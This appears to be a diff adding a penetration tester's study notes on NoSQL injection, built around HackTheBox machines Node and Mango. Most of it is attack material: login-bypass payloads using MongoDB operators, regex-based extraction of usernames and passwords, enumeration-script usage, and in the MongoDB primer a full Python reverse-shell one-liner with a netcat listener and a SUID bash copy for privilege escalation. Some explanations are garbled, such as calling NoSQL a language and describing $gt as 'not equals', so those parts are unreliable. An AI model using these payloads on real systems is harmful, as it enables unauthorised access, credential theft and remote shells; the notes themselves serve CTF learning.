@@ -1,0 +1,116 @@
+NoSQL Injection:
+===============
+Basics:
+	NoSQL is a language, not a database. NoSQL means Not-Only SQL. NoSQL databases dont use SQL language and rely on much simpler and structured query mechanism like JSON and JavaScript. It stores data via JSON and to retrive that data we use queries including JS queries.
+	NoSQL consists of key-value pairs.
+	NoSQL queries are also different from SQL queries as:
+		Examples:
+			1. SELECT * FROM users WHERE username = '$username' AND password = '$password' => SQL
+			   db.users.find({username: username, password: password}); => NoSQL
+	Syntax:	
+		Operators:
+			They are used like this:
+				variable_name[$operator_name]=value
+				id[$ne]=1
+			$gt
+			$lt
+			$gte
+			$lte
+			$ne => not equal
+			$where
+			$regex => Provides regular expression capabilities for pattern matching strings in queries. It is mostly used in NoSQLi to extract data
+		Symbols:
+			// => comment 
+			'
+			"
+		Arithemtic:
+			|| => OR
+			== => is equal to
+	Examples of NoSQL DB:
+		CouchDB: read in CouchDB NoSQL Injection section
+		MongoDB: read in MongoDB NoSQL Injection section
+		Important Note:
+			Every NoSQL DB uses its OWN LANGUAGE.
+MonogDB Nosql Primer:(HTB::Node)
+	MongoDB mostly operates on port 27017/27018
+	To connect to mongodb:
+		mongo -u user -p pass ip:port/db
+		mongo -u user -p pass localhost:27017/db
+		Commands:
+			db => shows curent db name
+			show collections => same as show tables of SQL
+			db.<table_name>.find() => same as "select * from <table_name>" of SQL
+			db.<table_name>.insert({key:"Value"}) => Insering data
+			Uploading a reverse shell into MongoDb table:
+				1. db.<table_name>.insert({key:"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
+					kali> nc -nvlp 1234
+				2. db.tasks.insert( { "cmd": "/bin/cp /bin/bash /tmp/tombash; chmod u+s /tmp/tombash;" } );
+					victim> /tmp/tombash -p
+MongoDB NoSQL Injection:(Used in HTB::Mango)
+	Basics:
+		MongoDB is a Document-oriented DB
+			A document-oriented database, or document store, is a computer program and data storage system designed for storing, retrieving and managing document-oriented information.
+			MongoDB calls "key-value pairs" as Documents
+		It uses BSON (Binary JSON) query language
+		MongoDb has no concept of a table. Lets say we have a collection of users, that collection is just individual user documents inside mongo.
+	Testing for SQli:
+		By getting an error:
+			Using symbols:
+				http://victim.com/haha?search=<symbol>
+				We can try:
+					'
+					"
+					//
+					{
+					}
+					;
+			Using operators:
+				If we are passing Data:(can be both GET and POST request)
+					Get Request
+						http://victim.com/login?user=1
+						http://victim.com/login?user[$ne]=1 => User not equals to 1
+							This will either log me in as user "1" or it will give us detail of every user execept "1" depending on application logic
+						http://victim.com/login?user[$gt]=1 => User not equals to 1
+					Post Request:
+						Lets say we have a login forum and we capture this post data:
+							username=user&password=pass&login=login
+							username[$ne]=user&password[$ne]=pass&login=login => username is not null and password is not null => dumps list of all users
+				If we are passing JSON:(Only POST request)	
+					Example:
+						Lets say we have a login forum and we capture this post data:
+							{"username": "user", "password": "pass"}	
+						We change it to the following payload:	
+							{"username": {"$ne": null}, "password": {"$ne": null}} => username is not null and password is not null => dumps list of all users
+					{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+					{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+					{"username": {"$gt":""}, "password": {"$gt":""}}
+			Fuzzing using ffuz:
+				wordlist to use => https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/no-sql-injection/mongodb.txt
+	Admin Bypass:
+		id=1' or '1'='1 => used in SQL
+		id=1' || '1'=='1 => used in NoSQL
+	Blind NoSQLi:
+	Extracting Data:(using $regex)
+		username[$regex]=^.{1}$&password[$ne]=pass&login=login => dumps any user whose name is only one character long
+		username[$regex]=^.{x}$&password[$ne]=pass&login=login => dumps any user whose name is "x" characters long
+	to dump users and passwords via Bruteforcing:
+		Nosql injection username and password enumeration script:(https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git)
+			Usage:
+				python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login -m POST => to enumerate username
+				python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login -m POST => to enumerate password
+				flags:
+					-u => url
+					-up => username parameter
+					-pp => password paramter
+					-op => any other paramters in data
+					-ep => parameter we wanna enumerate
+					-m => method (Post/Get)
+CouchDB Nosql Primer:
+CouchDB NoSQL Injection:
+Automated:
+	we cannot use SQLMAP for NoSQL
+	nosqlmap:
+		Installation:
+			git clone https://github.com/codingo/NoSQLMap.git
+			python setup.py install
+			python NoSQLMap => to launch nosqlmap
